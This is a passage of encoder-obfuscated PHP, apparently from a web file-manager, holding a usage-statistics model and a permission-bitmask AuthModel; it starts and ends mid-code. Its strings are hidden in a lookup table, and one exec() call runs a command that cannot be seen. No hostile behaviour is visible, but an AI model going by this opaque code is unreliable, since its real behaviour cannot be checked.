$this->{$Šú¡ëòô}($Æ¹ä¬ÉÊ); } return $this->listData(); } private function dateList($‹Áşşæ) { $Ù™ç“ õ =& $_SERVER[”ôÑ§ì¸]; $ÏÎ«¤­› = $‹Áşşæ; $Ğ´ƒ­è = strtotime($Ù™ç“ õ[1804]); $µëÄÀóÃ = array(); while ($ÏÎ«¤­› <= $Ğ´ƒ­è) { $µëÄÀóÃ[] = date($Ù™ç“ õ[1803], $ÏÎ«¤­›); $ÏÎ«¤­› = strtotime($Ù™ç“ õ[1806], $ÏÎ«¤­›); } return $µëÄÀóÃ; } public function _recordUser($ôëÔÔÁÒ = '') { $Ã®Üş =& $_SERVER[”ôÑ§ì¸]; $ŠÉßğŒø = strtotime(date($Ã®Üş[1807], strtotime($ôëÔÔÁÒ))); $ìëÄÇÇ¡ = strtotime(date($Ã®Üş[1808], strtotime($ôëÔÔÁÒ))); $Ô„ÖÉÍ = array($Ã®Üş[214] => array($Ã®Üş[1044], $ìëÄÇÇ¡)); $ûÁÔˆñæ = Model($Ã®Üş[566])->where($Ô„ÖÉÍ)->count($Ã®Üş[1674]); $Ô„ÖÉÍ[$Ã®Üş[214]] = array($Ã®Üş[376], array($ŠÉßğŒø, $ìëÄÇÇ¡)); $Óğà—Âõ = Model($Ã®Üş[566])->where($Ô„ÖÉÍ)->count($Ã®Üş[1674]); $Ô„ÖÉÍ[$Ã®Üş[33]] = $Ã®Üş[1809]; $êùäÚµå = Model($Ã®Üş[1810])->where($Ô„ÖÉÍ)->count($Ã®Üş[1811]); $Á”àöÄ¸ = array($Ã®Üş[238] => $ôëÔÔÁÒ, $Ã®Üş[787] => (int) $ûÁÔˆñæ, $Ã®Üş[1796] => (int) $Óğà—Âõ, $Ã®Üş[1797] => (int) $êùäÚµå); return $this->insert($Á”àöÄ¸); } public function _recordStore($²¶âÉ°ë = '') { $ø âë©ô =& $_SERVER[”ôÑ§ì¸]; $ß¤ÎÊ÷ò = strtotime(date($ø âë©ô[1808], strtotime($²¶âÉ°ë))); $§¡âìÊñ = array($ø âë©ô[214] => array($ø âë©ô[1044], $ß¤ÎÊ÷ò)); $Ş­ÉÉ¾ã = Model($ø âë©ô[511])->where($§¡âìÊñ)->sum($ø âë©ô[76]); $§¡âìÊñ[$ø âë©ô[452]] = 0; $¶ÀÇ­·± = Model($ø âë©ô[847])->where($§¡âìÊñ)->sum($ø âë©ô[76]); $§¡âìÊñ[$ø âë©ô[177]] = 1; $—§ËÓ¥Æ = Model($ø âë©ô[847])->where($§¡âìÊñ)->sum($ø âë©ô[76]); $§¡âìÊñ[$ø âë©ô[177]] = 2; $”ûÂÙÎÃ = Model($ø âë©ô[847])->where($§¡âìÊñ)->sum($ø âë©ô[76]); $ŒıññªÆ = array($ø âë©ô[238] => $²¶âÉ°ë, $ø âë©ô[785] => (int) $¶ÀÇ­·±, $ø âë©ô[1800] => (int) $Ş­ÉÉ¾ã, $ø âë©ô[1801] => (int) $—§ËÓ¥Æ, $ø âë©ô[1802] => (int) $”ûÂÙÎÃ); return $this->insert($ŒıññªÆ); } public function trend($´­øåŒ“, $ãºâã) { $Êˆğ¬Ÿ„ =& $_SERVER[”ôÑ§ì¸]; if (!$this->init($´­øåŒ“)) { return !1; } $¨òÏó¦ê = $this->trendList($´­øåŒ“); if ($¨òÏó¦ê && $ãºâã != $Êˆğ¬Ÿ„[1647]) { $ıÖã¸’ = $¨òÏó¦ê[0][$Êˆğ¬Ÿ„[238]]; $£Ğ––º = $this->validDate($ãºâã, $ıÖã¸’); $’í£†åì = array(); $ñÅºÛ½ñ = array_to_keyvalue($¨òÏó¦ê, $Êˆğ¬Ÿ„[238]); foreach ($£Ğ––º as $úÎ“õë–) { if (isset($ñÅºÛ½ñ[$úÎ“õë–])) { $ªÒàì¨ = $ñÅºÛ½ñ[$úÎ“õë–]; } else { $ªÒàì¨ = end($¨òÏó¦ê); $ªÒàì¨[$Êˆğ¬Ÿ„[238]] = $úÎ“õë–; if ($´­øåŒ“ == $Êˆğ¬Ÿ„[629]) { $ªÒàì¨[$Êˆğ¬Ÿ„[1796]] = $ªÒàì¨[$Êˆğ¬Ÿ„[1797]] = 0; } } $’í£†åì[] = $ªÒàì¨; } $¨òÏó¦ê = $’í£†åì; } $šô‘•Ï = array($Êˆğ¬Ÿ„[629] => array($Êˆğ¬Ÿ„[787] => LNG($Êˆğ¬Ÿ„[1812]), $Êˆğ¬Ÿ„[1796] => LNG($Êˆğ¬Ÿ„[1813]), $Êˆğ¬Ÿ„[1797] => LNG($Êˆğ¬Ÿ„[1814])), $Êˆğ¬Ÿ„[1798] => array($Êˆğ¬Ÿ„[785] => LNG($Êˆğ¬Ÿ„[1815]), $Êˆğ¬Ÿ„[1800] => LNG($Êˆğ¬Ÿ„[1816]), $Êˆğ¬Ÿ„[1801] => LNG($Êˆğ¬Ÿ„[1817]), $Êˆğ¬Ÿ„[1802] => LNG($Êˆğ¬Ÿ„[1818]))); $¡ß²«´ = array($Êˆğ¬Ÿ„[629] => $Êˆğ¬Ÿ„[1819], $Êˆğ¬Ÿ„[1798] => $Êˆğ¬Ÿ„[76]); if (empty($¨òÏó¦ê)) { $úÎ“õë– = date($Êˆğ¬Ÿ„[1803], strtotime($Êˆğ¬Ÿ„[1804])); $’³ú¨»¸ = array($Êˆğ¬Ÿ„[238] => $úÎ“õë–); foreach ($šô‘•Ï[$´­øåŒ“] as $â˜ğı‚ => $È¡£ñ×ã) { $’³ú¨»¸[$â˜ğı‚] = 0; } $¨òÏó¦ê[] = $’³ú¨»¸; } $“¶¬¿ì… = array(); foreach ($¨òÏó¦ê as $È¡£ñ×ã) { if ($´­øåŒ“ == $Êˆğ¬Ÿ„[1798] && $È¡£ñ×ã[$Êˆğ¬Ÿ„[1800]] > $È¡£ñ×ã[$Êˆğ¬Ÿ„[785]]) { $È¡£ñ×ã[$Êˆğ¬Ÿ„[1800]] = $È¡£ñ×ã[$Êˆğ¬Ÿ„[785]]; } foreach ($šô‘•Ï[$´­øåŒ“] as $â˜ğı‚ => $¦Ú¯ÑÃÖ) { $ªÒàì¨ = array($Êˆğ¬Ÿ„[238] => $È¡£ñ×ã[$Êˆğ¬Ÿ„[238]], $Êˆğ¬Ÿ„[1571] => $¦Ú¯ÑÃÖ); $ªÒàì¨[$¡ß²«´[$´­øåŒ“]] = isset($È¡£ñ×ã[$â˜ğı‚]) ? $È¡£ñ×ã[$â˜ğı‚] : 0; $“¶¬¿ì…[] = $ªÒàì¨; } } return $“¶¬¿ì…; } public function validDate($¨’İ®‘¿, $Ş¿ö¥Û¢) { $İÚüİÂ³ =& $_SERVER[”ôÑ§ì¸]; $È¬éñÚÖ = date($İÚüİÂ³[1803], strtotime($İÚüİÂ³[1804])); $À¢ÔìÇÚ = array($È¬éñÚÖ); switch ($¨’İ®‘¿) { case $İÚüİÂ³[1654]: $÷ç®İÓ = mktime(0, 0, 0, date($İÚüİÂ³[1820]), date($İÚüİÂ³[1390]) - date($İÚüİÂ³[1453]) + 7 - 7, date($İÚüİÂ³[1821])); $“èÈ¦îª = 0; do { $Ö×îÅÕŞ = date($İÚüİÂ³[1803], $÷ç®İÓ - 3600 * 24 * 7 * $“èÈ¦îª); $À¢ÔìÇÚ[] = $Ö×îÅÕŞ; $“èÈ¦îª++; } while ($Ş¿ö¥Û¢ < $Ö×îÅÕŞ); break; case $İÚüİÂ³[1652]: $“èÈ¦îª = 1; do { $äàñò¦‡ = date($İÚüİÂ³[1822], strtotime("\55\40{$“èÈ¦îª}\x20\x6d\157\x6e\164\150\x73")); $À¢ÔìÇÚ[] = $äàñò¦‡; $“èÈ¦îª++; } while ($Ş¿ö¥Û¢ < $äàñò¦‡); break; case $İÚüİÂ³[1823]: $æš€Ó›¥ = (int) date($İÚüİÂ³[1821], strtotime($Ş¿ö¥Û¢)); $è˜”ş˜¢ = (int) date($İÚüİÂ³[1821]); if ($æš€Ó›¥ >= $è˜”ş˜¢) { break; } for ($æš€Ó›¥; $æš€Ó›¥ < $è˜”ş˜¢; $æš€Ó›¥++) { $À¢ÔìÇÚ[] = $æš€Ó›¥ . $İÚüİÂ³[1824]; } break; default: break; } if ($Ş¿ö¥Û¢ > end($À¢ÔìÇÚ)) { array_pop($À¢ÔìÇÚ); } sort($À¢ÔìÇÚ); return $À¢ÔìÇÚ; } public function listTable($ØëÃĞØ”) { $¤ÎĞ‡ç‚ = ucfirst($ØëÃĞØ”); return Model($¤ÎĞ‡ç‚)->listData(); } public function option($ª‘ŒÈçÑ) { $Î©Ê¥ãŸ = $_SERVER[”ôÑ§ì¸][1825] . ucfirst($ª‘ŒÈçÑ); return $this->{$Î©Ê¥ãŸ}(); } private function optionUser() { $œç„îä§ =& $_SERVER[”ôÑ§ì¸]; $ØëîÉğê = Model($œç„îä§[566])->count($œç„îä§[1674]); $®Ç„çşˆ = Model($œç„îä§[566])->where($œç„îä§[1826])->count($œç„îä§[1674]); $šş¤õ±É = intval($GLOBALS[$œç„îä§[6]][$œç„îä§[392]][$œç„îä§[1626]]) / 3600; $‚„Ş¿ = strtotime("\x2d{$šş¤õ±É}\40\x68\157\165\x72\163"); $ÛÖ¢µ™‚ = strtotime(date($œç„îä§[1807])); if ($‚„Ş¿ < $ÛÖ¢µ™‚) { $‚„Ş¿ = $ÛÖ¢µ™‚; } $¶óÆô¤ğ = array($œç„îä§[1827] => array($œç„îä§[1045], $‚„Ş¿)); $Ïé×Œ = (int) Model($œç„îä§[566])->where($¶óÆô¤ğ)->count($œç„îä§[1674]); if (!$Ïé×Œ) { $Ïé×Œ = 1; } $¶óÆô¤ğ = array($œç„îä§[1827] => array($œç„îä§[1045], $ÛÖ¢µ™‚)); $†ºåó˜  = Model($œç„îä§[566])->where($¶óÆô¤ğ)->count($œç„îä§[1674]); return array($œç„îä§[780] => (int) $ØëîÉğê, $œç„îä§[1828] => (int) ($ØëîÉğê - $®Ç„çşˆ), $œç„îä§[1829] => (int) $®Ç„çşˆ, $œç„îä§[1830] => (int) $†ºåó˜ , $œç„îä§[1831] => $Ïé×Œ); } private function optionFile() { $•Ñ–ßğ” =& $_SERVER[”ôÑ§ì¸]; $œ‰©ı¨Ï = $this->sourceSize(); $ïÃ¼“¡­ = $œ‰©ı¨Ï[$•Ñ–ßğ”[76]]; $§ø¿Œ = $œ‰©ı¨Ï[$•Ñ–ßğ”[1800]]; $³§èÍ’à = Model($•Ñ–ßğ”[847])->where(array($•Ñ–ßğ”[452] => 0))->count($•Ñ–ßğ”[180]); $Á«„ª“  = array($•Ñ–ßğ”[452] => 0, $•Ñ–ßğ”[214] => array($•Ñ–ßğ”[1045], strtotime(date($•Ñ–ßğ”[1807])))); $ÙöĞš ¶ = Model($•Ñ–ßğ”[847])->where($Á«„ª“ )->sum($•Ñ–ßğ”[76]); $Ğ£‡ŒÈÆ = Model($•Ñ–ßğ”[847])->where($Á«„ª“ )->count($•Ñ–ßğ”[180]); return array($•Ñ–ßğ”[785] => $ïÃ¼“¡­, $•Ñ–ßğ”[1800] => $§ø¿Œ, $•Ñ–ßğ”[1832] => $ïÃ¼“¡­ - $§ø¿Œ, $•Ñ–ßğ”[1833] => (int) $ÙöĞš ¶, $•Ñ–ßğ”[787] => (int) $³§èÍ’à, $•Ñ–ßğ”[1834] => (int) $Ğ£‡ŒÈÆ); } private function optionAccess() { $¥ÄñÉÎî =& $_SERVER[”ôÑ§ì¸]; return array($¥ÄñÉÎî[780] => $this->typeLogCnt(), $¥ÄñÉÎî[107] => $this->typeLogCnt($¥ÄñÉÎî[107]), $¥ÄñÉÎî[492] => $this->typeLogCnt($¥ÄñÉÎî[492]), $¥ÄñÉÎî[1835] => $this->typeLogCnt($¥ÄñÉÎî[1835]), $¥ÄñÉÎî[1836] => $this->typeLogCnt($¥ÄñÉÎî[1836]), $¥ÄñÉÎî[629] => $this->typeLogCnt($¥ÄñÉÎî[12], $¥ÄñÉÎî[1811])); } private function typeLogCnt($’ßÑİ” = '', $å³Ú¸É¤ = "\151\x64") { $ÖãŒâ³é =& $_SERVER[”ôÑ§ì¸]; $Ü¥ŒïÓÇ = array($ÖãŒâ³é[107] => array($ÖãŒâ³é[1837], $ÖãŒâ³é[1838]), $ÖãŒâ³é[492] => array($ÖãŒâ³é[1839], $ÖãŒâ³é[1840]), $ÖãŒâ³é[1835] => array($ÖãŒâ³é[1841], $ÖãŒâ³é[1842], $ÖãŒâ³é[1843]), $ÖãŒâ³é[1836] => array($ÖãŒâ³é[1844], $ÖãŒâ³é[1845]), $ÖãŒâ³é[1846] => array($ÖãŒâ³é[1847], $ÖãŒâ³é[1848], $ÖãŒâ³é[1849])); $ã»Â”­ä = strtotime(date($ÖãŒâ³é[1807])); $ëƒÇåß± = array($ÖãŒâ³é[214] => array($ÖãŒâ³é[1045], $ã»Â”­ä)); if ($’ßÑİ”) { $ëƒÇåß±[$ÖãŒâ³é[33]] = array($ÖãŒâ³é[7], $Ü¥ŒïÓÇ[$’ßÑİ”]); } $ı¶¡ÑÄ½ = Model($ÖãŒâ³é[1810])->where($ëƒÇåß±)->count($å³Ú¸É¤); return (int) $ı¶¡ÑÄ½; } private function optionServer() { $å‡­¡Å€ =& $_SERVER[”ôÑ§ì¸]; $ÀãÆ‹í— = $this->diskDriver(); $ĞÃ®î® = KodIO::defaultDriver(); $ÕîÖÃÁÔ = array($å‡­¡Å€[839] => $ĞÃ®î®[$å‡­¡Å€[442]]); $ƒëá ¾É = Model($å‡­¡Å€[511])->where($ÕîÖÃÁÔ)->sum($å‡­¡Å€[76]); $¤óãäÈš = explode($å‡­¡Å€[53], $_SERVER[$å‡­¡Å€[143]]); $ŒôÆï‚ = $¤óãäÈš[0]; $Š»–Ùôä = $GLOBALS[$å‡­¡Å€[6]][$å‡­¡Å€[21]]; $¼‰ôõĞù = $Š»–Ùôä[$å‡­¡Å€[1007]]; if ($¼‰ôõĞù == $å‡­¡Å€[995]) { $å¶ôû„¼ = explode($å‡­¡Å€[1313], $Š»–Ùôä[$å‡­¡Å€[1006]]); $¼‰ôõĞù = $å¶ôû„¼[0]; } if ($¼‰ôõĞù == $å‡­¡Å€[943] || $¼‰ôõĞù == $å‡­¡Å€[826]) { $ãóÒé“ø = Model()->db()->query($å‡­¡Å€[1850]); $¿¹ä©Êê = $ãóÒé“ø[0] && isset($ãóÒé“ø[0][$å‡­¡Å€[1570]]) ? $ãóÒé“ø[0][$å‡­¡Å€[1570]] : 0; $¼‰ôõĞù = $å‡­¡Å€[1851] . ($¿¹ä©Êê ? $å‡­¡Å€[8] . $¿¹ä©Êê : $å‡­¡Å€[12]); } $Ç§¨‘ò€ = $GLOBALS[$å‡­¡Å€[6]][$å‡­¡Å€[392]][$å‡­¡Å€[849]]; return array($å‡­¡Å€[1852] => $ÀãÆ‹í— ? $ÀãÆ‹í—[$å‡­¡Å€[1853]] : 0, $å‡­¡Å€[1854] => $ÀãÆ‹í— ? $ÀãÆ‹í—[$å‡­¡Å€[1855]] : 0, $å‡­¡Å€[1856] => (int) $ĞÃ®î®[$å‡­¡Å€[1853]] * 1024 * 1024 * 1024, $å‡­¡Å€[1857] => (int) $ƒëá ¾É, $å‡­¡Å€[1858] => ucfirst($ŒôÆï‚), $å‡­¡Å€[1859] => $å‡­¡Å€[1860] . PHP_VERSION, $å‡­¡Å€[1861] => phpBuild64() ? 64 : 32, $å‡­¡Å€[779] => str_replace($å‡­¡Å€[1161], $å‡­¡Å€[1023], $¼‰ôõĞù), $å‡­¡Å€[392] => ucfirst($Ç§¨‘ò€), $å‡­¡Å€[32] => $_SERVER[$å‡­¡Å€[1862]]); } private function diskDriver() { $‰ŞÊ¨• =& $_SERVER[”ôÑ§ì¸]; $åÀ¡Îø“ = $‰ŞÊ¨•[8]; $†²Œ’ = $GLOBALS[$‰ŞÊ¨•[6]][$‰ŞÊ¨•[1330]] == $‰ŞÊ¨•[1331]; if ($†²Œ’) { $åÀ¡Îø“ = $‰ŞÊ¨•[1863]; if (function_exists($‰ŞÊ¨•[1864])) { exec($‰ŞÊ¨•[1865], $ƒüÖã­); $åÀ¡Îø“ = $ƒüÖã­[1] . $‰ŞÊ¨•[8]; } } if (!file_exists($åÀ¡Îø“)) { return; } $îÄÑ¤Ÿİ = @disk_total_space($åÀ¡Îø“); $ûğÆàŠ = $îÄÑ¤Ÿİ - @disk_free_space($åÀ¡Îø“); return array($‰ŞÊ¨•[1853] => $îÄÑ¤Ÿİ, $‰ŞÊ¨•[1855] => $ûğÆàŠ); } public function fileChart($ˆô˜Ú“ü) { $É¥´Ø…Ò =& $_SERVER[”ôÑ§ì¸]; if (isset($ˆô˜Ú“ü[$É¥´Ø…Ò[1674]])) { return Model($É¥´Ø…Ò[847])->userFileTypeProfile($ˆô˜Ú“ü[$É¥´Ø…Ò[1674]]); } if (isset($ˆô˜Ú“ü[$É¥´Ø…Ò[1866]])) { return Model($É¥´Ø…Ò[847])->groupFileTypeProfile($ˆô˜Ú“ü[$É¥´Ø…Ò[1866]]); } $äôğš‘ù = $this->sourceSize(); $Öñ¡™«˜ = array($É¥´Ø…Ò[179] => 0, $É¥´Ø…Ò[177] => 1); $Œº±¹ùë = Model($É¥´Ø…Ò[847])->where($Öñ¡™«˜)->sum($É¥´Ø…Ò[76]); $Öñ¡™«˜[$É¥´Ø…Ò[177]] = 2; $Å‡Ÿß™¢ = Model($É¥´Ø…Ò[847])->where($Öñ¡™«˜)->sum($É¥´Ø…Ò[76]); return array($É¥´Ø…Ò[785] => $äôğš‘ù[$É¥´Ø…Ò[76]], $É¥´Ø…Ò[1800] => $äôğš‘ù[$É¥´Ø…Ò[1800]], $É¥´Ø…Ò[1801] => (int) $Œº±¹ùë, $É¥´Ø…Ò[1802] => (int) $Å‡Ÿß™¢); } private function sourceSize() { $ĞÎñÛÈö =& $_SERVER[”ôÑ§ì¸]; $àš×Š = Model($ĞÎñÛÈö[847])->where(array($ĞÎñÛÈö[452] => 0))->sum($ĞÎñÛÈö[76]); $ŸùÁŒçŠ = Model($ĞÎñÛÈö[511])->sum($ĞÎñÛÈö[76]); if ($ŸùÁŒçŠ > $àš×Š) { $ŸùÁŒçŠ = $àš×Š; } return array($ĞÎñÛÈö[76] => (int) $àš×Š, $ĞÎñÛÈö[1800] => (int) $ŸùÁŒçŠ); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $°°›çÛ’ =& $_SERVER[”ôÑ§ì¸]; $î¸èæ = array(array($°°›çÛ’[461] => LNG($°°›çÛ’[1867]), $°°›çÛ’[1868] => $°°›çÛ’[1869], $°°›çÛ’[1870] => 1, $°°›çÛ’[1871] => 1, $°°›çÛ’[1872] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($°°›çÛ’[461] => LNG($°°›çÛ’[1873]), $°°›çÛ’[1868] => $°°›çÛ’[1874], $°°›çÛ’[1870] => 2, $°°›çÛ’[1871] => 1, $°°›çÛ’[1872] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($°°›çÛ’[461] => LNG($°°›çÛ’[1875]), $°°›çÛ’[1868] => $°°›çÛ’[1876], $°°›çÛ’[1870] => 3, $°°›çÛ’[1871] => 1, $°°›çÛ’[1872] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($°°›çÛ’[461] => LNG($°°›çÛ’[1877]), $°°›çÛ’[1868] => $°°›çÛ’[1878], $°°›çÛ’[1870] => 4, $°°›çÛ’[1871] => 1, $°°›çÛ’[1872] => self::AUTH_SHOW | self::AUTH_VIEW), array($°°›çÛ’[461] => LNG($°°›çÛ’[1879]), $°°›çÛ’[1868] => $°°›çÛ’[1880], $°°›çÛ’[1870] => 5, $°°›çÛ’[1871] => 1, $°°›çÛ’[1872] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($°°›çÛ’[461] => LNG($°°›çÛ’[1881]), $°°›çÛ’[1868] => $°°›çÛ’[1882], $°°›çÛ’[1870] => 6, $°°›çÛ’[1871] => 1, $°°›çÛ’[1872] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($°°›çÛ’[461] => LNG($°°›çÛ’[1883]), $°°›çÛ’[1868] => $°°›çÛ’[1884], $°°›çÛ’[1870] => 7, $°°›çÛ’[1871] => 1, $°°›çÛ’[1872] => 0)); return $î¸èæ; } public static function authCheck($ÈÕ’Ë, $¤‰àßŞ½) { $é Ğ ¿µ =& $_SERVER[”ôÑ§ì¸]; $ÈÕ’Ë = intval($ÈÕ’Ë); if ($GLOBALS[$é Ğ ¿µ[535]] && $GLOBALS[$é Ğ ¿µ[6]][$é Ğ ¿µ[1885]]) { return !0; } if ($ÈÕ’Ë <= 0) { return !1; } if (($ÈÕ’Ë & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($ÈÕ’Ë & $¤‰àßŞ½); } public static function authCheckShow($İ©£ªÛç) { return self::authCheck($İ©£ªÛç, self::AUTH_SHOW); } public static function authCheckView($Õ®°´ÌÑ) { return self::authCheck($Õ®°´ÌÑ, self::AUTH_VIEW); } public static function authCheckDownload($ º¸´±½) { return self::authCheck($ º¸´±½, self::AUTH_DOWNLOAD); } public static function authCheckUpload($“¿š†Œ) { return self::authCheck($“¿š†Œ, self::AUTH_UPLOAD); } public static function authCheckEdit($ø ¨’øÊ) { return self::authCheck($ø ¨’øÊ, self::AUTH_EDIT); } public static function authCheckRemove($†â‚šá¦) { return self::authCheck($†â‚šá¦, self::AUTH_REMOVE); } public static function authCheckShare($ßÚ¤âú¸) { return self::authCheck($ßÚ¤âú¸, self::AUTH_SHARE); } public static function authCheckComment($™ã±ñúú) { return self::authCheck($™ã±ñúú, self::AUTH_COMMENT); } public static function authCheckEvent($Œ´—¿ù) { return self::authCheck($Œ´—¿ù, self::AUTH_EVENT); } public static function authCheckRoot($‡½ÛéÂû) { return self::authCheck($‡½ÛéÂû, self::AUTH_ROOT); } public static function authCheckAction($ÕŞ·é²ˆ, $ãæâüšÍ) { $…×îí‰ =& $_SERVER[”ôÑ§ì¸]; $ë”Ÿ™”â = array($…×îí‰[1886] => self::AUTH_VIEW, $…×îí‰[1225] => self::AUTH_DOWNLOAD, $…×îí‰[107] => self::AUTH_UPLOAD, $…×îí‰[1836] => self::AUTH_EDIT, $…×îí‰[1835] => self::AUTH_REMOVE, $…×îí‰[1846] => self::AUTH_SHARE, $…×îí‰[397] => self::AUTH_COMMENT, $…×îí‰[1662] => self::AUTH_EVENT, $…×îí‰[1887] => self::AUTH_ROOT); if (!isset($ë”Ÿ™”â[$ãæâüšÍ])) { return; } $‚Çò£„ = $ë”Ÿ™”â[$ãæâüšÍ]; $ÕŞ·é²ˆ = intval($ÕŞ·é²ˆ); if ($ÕŞ·é²ˆ <= 0) { return !1; } if (($ÕŞ·é²ˆ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($ÕŞ·é²ˆ & $‚Çò£„); } public static function authDisable($¼áˆîŒå, $æëÏıÃÉ) { if (intval($¼áˆîŒå) <= 0) { return 0; } return intval($¼áˆîŒå) & ~$æëÏıÃÉ; } public $optionType = "\123\x79\x73\164\x65\x6d\56\x73\x6f\x75\x72\143\x65\101\165\164\150\x4c\151\163\x74"; public $field = array("\156\x61\155\145", "\x61\x75\164\x68", "\154\x61\x62\x65\x6c", "\144\151\x73\160\154\x61\x79", "\163\x79\163\164\145\155", "\163\x6f\162\x74"); public function initData() { $†Ãø½Û¤ = $this->authDefault(); foreach ($†Ãø½Û¤ as $ıß·ù¯Ÿ) { $this->add($ıß·ù¯Ÿ); } } public function findAuth($Ú«ş—‚„, $ø‚ó…£) { $àõ”„ç =& $_SERVER[”ôÑ§ì¸]; $ÊøİşŒ = parent::listData(); foreach ($ÊøİşŒ as $½ì÷¢õ) { $ˆœÌŸÑ = intval($½ì÷¢õ[$àõ”„ç[454]]); if ($ˆœÌŸÑ <= 0 || $½ì÷¢õ[$àõ”„ç[1888]] == 0) { continue; } if (($ˆœÌŸÑ & $Ú«ş—‚„) != $Ú«ş—‚„) { continue; } if (($ˆœÌŸÑ & $ø‚ó…£) != 0) { continue; } return $½ì÷¢õ[$àõ”„ç[442]]; } return !1; } public function findAuthReadOnly() { $…ÆºİÈ¶ = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $¨‚öúİü = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($…ÆºİÈ¶, $¨‚öúİü); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $™â£õªÆ =& $_SERVER[”ôÑ§ì¸]; $»œÉç = parent::listData(); $ş®¦Û“ú = !1; foreach ($»œÉç as $ÚÆÆ¹‹†) { if ($ÚÆÆ¹‹†[$™â£õªÆ[454]] <= 0 || $ÚÆÆ¹‹†[$™â£õªÆ[1888]] == $™â£õªÆ[211]) { continue; } if (!$ş®¦Û“ú) { $ş®¦Û“ú = $ÚÆÆ¹‹†; continue; } if ($ş®¦Û“ú[$™â£õªÆ[454]] > $ÚÆÆ¹‹†[$™â£õªÆ[454]]) { $ş®¦Û“ú = $ÚÆÆ¹‹†; } } return $ş®¦Û“ú ? $ş®¦Û“ú[$™â£õªÆ[442]] : $™â£õªÆ[12]; } public function listData($ßö§Ïí = false, $˜èã¥õÜ = "\x73\157\162\x74", $ÚÕè«’ = false) { return parent::listData($ßö§Ïí, $˜èã¥õÜ, $ÚÕè«’); } public function update($óòø¥õÏ, $Šƒğâ£Á) { $­ù³àĞ… =& $_SERVER[”ôÑ§ì¸]; $„ƒû§ = parent::listData($óòø¥õÏ); $‹âÁ¿—° = $this->findByName($Šƒğâ£Á[$­ù³àĞ…[32]]); if (!$„ƒû§ || $‹âÁ¿—° && $‹âÁ¿—°[$­ù³àĞ…[442]] != $„ƒû§[$­ù³àĞ…[442]]) { return !1; } $this->filterAuth($Šƒğâ£Á[$­ù³àĞ…[454]]); return parent::update($óòø¥õÏ, $Šƒğâ£Á); } public function remove($€Åì»Ğ˜) { $œ¤øªÒî = parent::listData($€Åì»Ğ˜); if (!$œ¤øªÒî || $œ¤øªÒî[$_SERVER[”ôÑ§ì¸][178]]) { return !1; } return parent::remove($€Åì»Ğ˜); } public function add($·ï©ÈÈí = array()) { $ÓÛ°ÁÖğ =& $_SERVER[”ôÑ§ì¸]; if ($this->findByName($·ï©ÈÈí[$ÓÛ°ÁÖğ[32]])) { return !1; } $ĞÍáØ“ê = array($ÓÛ°ÁÖğ[32] => $ÓÛ°ÁÖğ[12], $ÓÛ°ÁÖğ[454] => 1, $ÓÛ°ÁÖğ[1889] => $ÓÛ°ÁÖğ[1876], $ÓÛ°ÁÖğ[1888] => 1, $ÓÛ°ÁÖğ[178] => 0, $ÓÛ°ÁÖğ[1890] => 0); $·ï©ÈÈí = array_merge($ĞÍáØ“ê, $·ï©ÈÈí); $·ï©ÈÈí[$ÓÛ°ÁÖğ[1890]] = $this->getSort(); $this->filterAuth($·ï©ÈÈí[$ÓÛ°ÁÖğ[454]]); return parent::insert($·ï©ÈÈí); } private function getSort() { $î·“Ÿ¸à =& $_SERVER[”ôÑ§ì¸]; $ê·Ûí›× = parent::listData(); $”Ğ€Àãº = array_to_keyvalue($ê·Ûí›×, $î·“Ÿ¸à[12], $î·“Ÿ¸à[1890]); return empty($”Ğ€Àãº) ? 0 : max($”Ğ€Àãº) + 1; } private function filterAuth(&$©Èş“®Ï) { if (!$©Èş“®Ï) { return; } $ğŞû¯õÌ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $±ù¦‡Î€ = array(); foreach ($ğŞû¯õÌ as $üÜ’ÃÔ­) { if ($©Èş“®Ï & $üÜ’ÃÔ­) { $±ù¦‡Î€[] = $üÜ’ÃÔ­; } } if (in_array(self::AUTH_ROOT, $±ù¦‡Î€)) { $©Èş“®Ï = array_sum($ğŞû¯õÌ); return; } $¾€¹“…Œ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($±ù¦‡Î€ as $üÜ’ÃÔ­) { if (isset($¾€¹“…Œ[$üÜ’ÃÔ­])) { $±ù¦‡Î€ = array_merge($±ù¦‡Î€, $¾€¹“…Œ[$üÜ’ÃÔ­]); } } $±ù¦‡Î€[] = 